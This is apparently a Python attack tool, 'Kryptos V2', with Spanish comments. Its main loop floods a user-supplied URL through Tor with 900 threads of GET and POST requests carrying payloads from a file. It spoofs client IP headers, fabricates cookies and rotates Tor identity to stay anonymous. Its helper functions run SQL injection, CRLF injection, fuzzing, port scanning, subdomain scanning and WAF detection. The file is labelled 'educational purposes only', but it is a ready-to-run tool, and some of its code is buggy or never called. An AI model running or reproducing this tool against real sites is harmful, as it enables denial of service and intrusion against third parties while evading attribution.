import requests
import random
import sys
import os
import time
import subprocess
import platform
import socket
from fake_useragent import UserAgent
from stem.control import Controller
from stem import Signal
from colorama import Fore, init
from concurrent.futures import ThreadPoolExecutor

# Inicializar colorama
init()

# Configuración global
ua = UserAgent()
user_agent = ua.random
num_threads = 900

# Clase para mensajes de log
class Log:
    wait = f"{Fore.LIGHTWHITE_EX}[{Fore.LIGHTCYAN_EX} * {Fore.LIGHTWHITE_EX}]"
    success = f"{Fore.LIGHTWHITE_EX}[{Fore.LIGHTGREEN_EX} ✓ {Fore.LIGHTWHITE_EX}]"
    error = f"{Fore.LIGHTWHITE_EX}[{Fore.LIGHTRED_EX} X {Fore.LIGHTWHITE_EX}]"

# Función para cambiar la identidad de Tor
def change_tor_identity(tor_password):
    try:
        with Controller.from_port(port=9051) as controller:
            controller.authenticate(password=tor_password)
            controller.signal(Signal.NEWNYM)
            print(Log.success + f" {Fore.LIGHTWHITE_EX}Cambio de IP de TOR completado.")
    except Exception as e:
        print(Log.error + f" {Fore.LIGHTWHITE_EX}Error al cambiar la identidad de Tor: {e}")

# Función de animación de carga
def loading_animation(duration):
    chars = ['/','|','\\','-']
    end_time = time.time() + duration
    while time.time() < end_time:
        for char in chars:
            sys.stdout.write(f'\r{Fore.LIGHTWHITE_EX}[{Fore.LIGHTMAGENTA_EX}{char}{Fore.LIGHTWHITE_EX}]{Fore.LIGHTCYAN_EX} Ataque en progreso. . . ')
            sys.stdout.flush()
            time.sleep(00.1)

# Cargar payloads desde un archivo
def load_payloads(file_path):
    try:
        with open(file_path, 'r') as file:
            return [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print(Log.error + f" {Fore.LIGHTWHITE_EX}Archivo de payloads no encontrado: {file_path}")
        sys.exit(1)

# Mostrar el título del programa
def title():
    os.system('clear || cls')
    sys.stdout.write(f'''{Fore.LIGHTGREEN_EX}
██╗  ██╗██████╗ ██╗   ██╗██████╗ ████████╗ ██████╗ ███████╗
██║ ██╔╝██╔══██╗╚██╗ ██╔╝██╔══██╗╚══██╔══╝██╔═══██╗██╔════╝
█████╔╝ ██████╔╝ ╚████╔╝ ██████╔╝   ██║   ██║   ██║███████╗
██╔═██╗ ██╔══██╗  ╚██╔╝  ██╔═══╝    ██║   ██║   ██║╚════██║
██║  ██╗██║  ██║   ██║   ██║        ██║   ╚██████╔╝███████║
╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝        ╚═╝    ╚═════╝ ╚══════╝

{Fore.LIGHTMAGENTA_EX}+{Fore.LIGHTGREEN_EX} -- --=>{Fore.LIGHTMAGENTA_EX}[{Fore.LIGHTWHITE_EX} Propósitos Educativos Únicamente {Fore.LIGHTMAGENTA_EX}]
{Fore.LIGHTMAGENTA_EX}+{Fore.LIGHTGREEN_EX} -- --=>{Fore.LIGHTMAGENTA_EX}[{Fore.LIGHTWHITE_EX} Herramienta Anónima Kryptos V2 {Fore.LIGHTMAGENTA_EX}]
{Fore.LIGHTMAGENTA_EX}+{Fore.LIGHTGREEN_EX} -- --=>{Fore.LIGHTMAGENTA_EX}[{Fore.LIGHTWHITE_EX} Por 0X4171341 {Fore.LIGHTMAGENTA_EX}]
\n''')

# Configuración de cookies
def generate_cookies():
    return {
        "sessionid": ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=32)),
        "csrftoken": ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=40)),
        "userid": ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=10)),
        "tracking_id": ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=16)),
        "custom_cookie": ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=24)),
        "extra_cookie_1": ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=20)),
        "extra_cookie_2": ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=15)),
        "hook_cookie": f"hook-{random.randint(10000, 99999)}",
    }

# Configuración de encabezados
def generate_headers():
    return {
        "Content-Type": "application/json",
        "User-Agent": user_agent,
        "Accept-Language": random.choice(["en-US,en;q=0.9", "fr-FR,fr;q=0.9", "es-ES,es;q=0.9", "de-DE,de;q=0.9"]),
        "Referer": random.choice(["https://google.com", "https://yahoo.com", "https://bing.com"]),
        "Connection": "close",
        "Accept-Encoding": "gzip, deflate, br",
        "Origin": random.choice(["https://google.com", "https://yahoo.com", "https://bing.com"]),
        "DNT": "1",
        "Expires": "0",
        "X-Download-Options": "noopen",
        "X-Robots-Tag": "noindex, nofollow",
        "Accept": random.choice(["text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "application/json,text/html"]),
        'x-ims-clientid': 'homepage_milo',
        "Pragma": "no-cache",
        "TE": "Trailers",
        "Upgrade-Insecure-Requests": "1",
        "Forwarded": f"for={random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)};proto=https",
        "If-None-Match": f"{random.randint(10000, 99999)}",
        "X-Real-IP": f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
        "X-Forwarded-Proto": "https",
        "X-Frame-Options": "DENY",
        "Referrer-Policy": "no-referrer",
        "Content-Security-Policy": "default-src 'self'",
        "X-Content-Type-Options": "nosniff",
        "Strict-Transport-Security": "max-age=31536000; includeSubDomains",
        "Feature-Policy": "geolocation 'none'",
        "Permissions-Policy": "camera=(), microphone=()",
        "Accept-CH": "DPR, Viewport-Width, Width",
        "X-Permitted-Cross-Domain-Policies": "none",
        "Access-Control-Allow-Origin": "*",
        "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
        "Access-Control-Allow-Headers": "Content-Type, Authorization",
        "X-XSS-Protection": "1; mode=block",
        "Custom-Header": random.choice(["value1", "value2", "value3"]),
        "X-Requested-With": random.choice(["XMLHttpRequest", "Fetch"]),
        "Content-Disposition": random.choice(["inline", "attachment"]),
        "Cache-Control": random.choice(["no-store", "no-cache", "must-revalidate"]),
        "X-Hook-Token": f"hook-token-{random.randint(10000, 99999)}",
        "X-Hook-ID": f"hook-id-{random.randint(10000, 99999)}",
        "X-Remote-Address": f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
        "X-User-Type": random.choice(["guest", "member", "admin"]),
    }

# Configuración del proxy TOR
tor_proxy = {
    'http': 'socks5h://127.0.0.1:9050',
    'https': 'socks5h://127.0.0.1:9050'
}

# Lista de caracteres para la animación
char = [
    f'....',

    f'{Fore.YELLOW}E{Fore.WHITE}...',
    f'{Fore.WHITE}.{Fore.YELLOW}E{Fore.WHITE}..',
    f'{Fore.WHITE}..{Fore.YELLOW}E{Fore.WHITE}.',
    f'{Fore.WHITE}...{Fore.YELLOW}E',

    f'{Fore.YELLOW}J{Fore.WHITE}...',
    f'{Fore.WHITE}.{Fore.YELLOW}J{Fore.WHITE}..',
    f'{Fore.WHITE}..{Fore.YELLOW}J{Fore.WHITE}.',
    f'{Fore.WHITE}...{Fore.YELLOW}J',

    f'{Fore.YELLOW}M{Fore.WHITE}...',
    f'{Fore.WHITE}.{Fore.YELLOW}M{Fore.WHITE}..',
    f'{Fore.WHITE}..{Fore.YELLOW}M{Fore.WHITE}.',
    f'{Fore.WHITE}...{Fore.YELLOW}M',

    f'{Fore.YELLOW}P{Fore.WHITE}...',
    f'{Fore.WHITE}.{Fore.YELLOW}P{Fore.WHITE}..',
    f'{Fore.WHITE}..{Fore.YELLOW}P{Fore.WHITE}.',
    f'{Fore.WHITE}...{Fore.YELLOW}P',

    f'{Fore.YELLOW}I{Fore.WHITE}...',
    f'{Fore.WHITE}.{Fore.YELLOW}I{Fore.WHITE}..',
    f'{Fore.WHITE}..{Fore.YELLOW}I{Fore.WHITE}.',
    f'{Fore.WHITE}...{Fore.YELLOW}I',
]

# Función para enviar una solicitud GET
def send_get_request(payload):
    try:
        random_char = random.choice(char)
        response = requests.get(url, proxies=tor_proxy, params={'data': payload}, headers=headers, cookies=cookies)
        print(Log.success + f" {random_char} {Fore.LIGHTWHITE_EX}-{Fore.LIGHTGREEN_EX} GET {Fore.LIGHTWHITE_EX}- ESTADO :{Fore.LIGHTCYAN_EX} {response.status_code} {Fore.LIGHTWHITE_EX}- {payload}")
    except Exception as e:
        print(Log.error + f" {Fore.LIGHTWHITE_EX}Error en solicitud GET: {e}")

# Función para enviar una solicitud POST
def send_post_request(payload):
    try:
        random_char = random.choice(char)
        response = requests.post(url, proxies=tor_proxy, data={'data': payload}, headers=headers, cookies=cookies)
        print(Log.success + f" {random_char} {Fore.LIGHTWHITE_EX}-{Fore.LIGHTGREEN_EX} POST {Fore.LIGHTWHITE_EX}- ESTADO :{Fore.LIGHTCYAN_EX} {response.status_code} {Fore.LIGHTWHITE_EX}- {payload}")
    except Exception as e:
        print(Log.error + f" {Fore.LIGHTWHITE_EX}Error en solicitud POST: {e}")

# Función para pruebas de stress HTTP/HTTPS
def stress_test(url, num_requests):
    with ThreadPoolExecutor(max_workers=num_requests) as executor:
        futures = [executor.submit(requests.get, url, proxies=tor_proxy, headers=headers, cookies=cookies) for _ in range(num_requests)]
        for future in futures:
            try:
                response = future.result()
                print(f"Status: {response.status_code} - {response.url}")
            except Exception as e:
                print(f"Error: {e}")

# Función para pruebas de inyección SQL básica
def sql_injection_test(url, payload):
    try:
        response = requests.post(url, data={'data': payload}, proxies=tor_proxy, headers=headers, cookies=cookies)
        if "error" in response.text.lower() or "syntax" in response.text.lower():
            print(Log.success + f" {Fore.LIGHTWHITE_EX}Posible vulnerabilidad SQL detectada en {url} con payload: {payload}")
        else:
            print(Log.wait + f" {Fore.LIGHTWHITE_EX}No se detectó vulnerabilidad con payload: {payload}")
    except Exception as e:
        print(Log.error + f" {Fore.LIGHTWHITE_EX}Error en prueba de inyección SQL: {e}")

# Función para pruebas de fuzzing
def fuzzing_test(url, payloads):
    for payload in payloads:
        try:
            response = requests.post(url, data={'data': payload}, proxies=tor_proxy, headers=headers, cookies=cookies)
            if response.status_code >= 400:
                print(Log.success + f" {Fore.LIGHTWHITE_EX}Respuesta inesperada con payload: {payload} - Código: {response.status_code}")
            else:
                print(Log.wait + f" {Fore.LIGHTWHITE_EX}Payload {payload} no causó errores.")
        except Exception as e:
            print(Log.error + f" {Fore.LIGHTWHITE_EX}Error en prueba de fuzzing: {e}")

# Función para escaneo de cabeceras HTTP
def scan_http_headers(url):
    try:
        response = requests.get(url, proxies=tor_proxy, headers=headers, cookies=cookies)
        headers = response.headers
        if 'X-Frame-Options' not in headers:
            print(Log.error + f" {Fore.LIGHTWHITE_EX}Falta la cabecera X-Frame-Options en {url}")
        if 'Content-Security-Policy' not in headers:
            print(Log.error + f" {Fore.LIGHTWHITE_EX}Falta la cabecera Content-Security-Policy en {url}")
        if 'Strict-Transport-Security' not in headers:
            print(Log.error + f" {Fore.LIGHTWHITE_EX}Falta la cabecera Strict-Transport-Security en {url}")
    except Exception as e:
        print(Log.error + f" {Fore.LIGHTWHITE_EX}Error al escanear cabeceras HTTP: {e}")

# Función para pruebas de inyección CRLF
def crlf_injection_test(url, payload):
    try:
        response = requests.get(f"{url}{payload}", proxies=tor_proxy, headers=headers, cookies=cookies)
        if "Set-Cookie" in response.headers:
            print(Log.success + f" {Fore.LIGHTWHITE_EX}Posible vulnerabilidad CRLF detectada en {url} con payload: {payload}")
        else:
            print(Log.wait + f" {Fore.LIGHTWHITE_EX}No se detectó vulnerabilidad con payload: {payload}")
    except Exception as e:
        print(Log.error + f" {Fore.LIGHTWHITE_EX}Error en prueba de inyección CRLF: {e}")

# Función para escaneo de puertos
def port_scan(host, ports):
    for port in ports:
        try:
            with socket.create_connection((host, port), timeout=1):
                print(Log.success + f" {Fore.LIGHTWHITE_EX}Puerto {port} abierto en {host}")
        except:
            print(Log.wait + f" {Fore.LIGHTWHITE_EX}Puerto {port} cerrado en {host}")

# Función para escaneo de subdominios
def subdomain_scan(domain, wordlist):
    for sub in wordlist:
        url = f"http://{sub}.{domain}"
        try:
            response = requests.get(url, proxies=tor_proxy, headers=headers, cookies=cookies)
            if response.status_code < 400:
                print(Log.success + f" {Fore.LIGHTWHITE_EX}Subdominio encontrado: {url}")
        except:
            pass

# Función para detección de WAF
def detect_waf(url):
    try:
        response = requests.get(url, proxies=tor_proxy, headers=headers, cookies=cookies)
        if "X-WAF" in response.headers or "WAF" in response.headers:
            print(Log.success + f" {Fore.LIGHTWHITE_EX}WAF detectado en {url}")
        else:
            print(Log.wait + f" {Fore.LIGHTWHITE_EX}No se detectó WAF en {url}")
    except Exception as e:
        print(Log.error + f" {Fore.LIGHTWHITE_EX}Error al detectar WAF: {e}")

# Función para verificar si Tor está instalado
def check_tor_installed():
    try:
        if platform.system().lower() == 'windows':
            subprocess.check_output(["where", "tor"], stderr=subprocess.STDOUT)
        else:
            subprocess.check_output(["which", "tor"], stderr=subprocess.STDOUT)
        return True
    except subprocess.CalledProcessError:
        return False

# Función para instalar Tor en Linux
def install_tor_linux():
    try:
        print(f"{Fore.YELLOW}Instalando Tor...{Fore.RESET}")
        subprocess.check_call(["sudo", "apt-get", "update"])
        subprocess.check_call(["sudo", "apt-get", "install", "-y", "tor"])
        print(f"{Fore.GREEN}Tor instalado correctamente.{Fore.RESET}")
    except Exception as e:
        print(f"{Fore.RED}Error al instalar Tor: {e}{Fore.RESET}")

# Entrada del usuario
title()
url = input(f'{Fore.LIGHTWHITE_EX}URL{Fore.LIGHTMAGENTA_EX} +-=>{Fore.LIGHTWHITE_EX} ')
tor_password = input(f'{Fore.LIGHTWHITE_EX}CONTRASEÑA TOR{Fore.LIGHTMAGENTA_EX} +-=>{Fore.LIGHTWHITE_EX} ')
loading_animation(2)
print()

# Verificación de instalación de Tor
if not check_tor_installed():
    print(f"{Fore.RED}Tor no está instalado.{Fore.RESET}")
    if platform.system().lower() == 'linux':
        install_tor_linux()
    else:
        print(f"{Fore.YELLOW}Por favor, instala Tor manualmente e intenta nuevamente.{Fore.RESET}")
        exit(1)

print(f"{Fore.GREEN}Tor está instalado.{Fore.RESET}")

# Cargar payloads
payloads = load_payloads('payload.txt')

# Configurar cookies y encabezados
cookies = generate_cookies()
headers = generate_headers()

# Ejecutar el programa
try:
    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        change_tor_identity(tor_password)
        while True:
            payload = random.choice(payloads)
            if random.choice([True, False]):
                executor.submit(send_get_request, payload)
            else:
                executor.submit(send_post_request, payload)
            time.sleep(00.1)
except Exception as e:
    print(f"{Fore.RED}Ocurrió un error: {e}{Fore.RESET}")
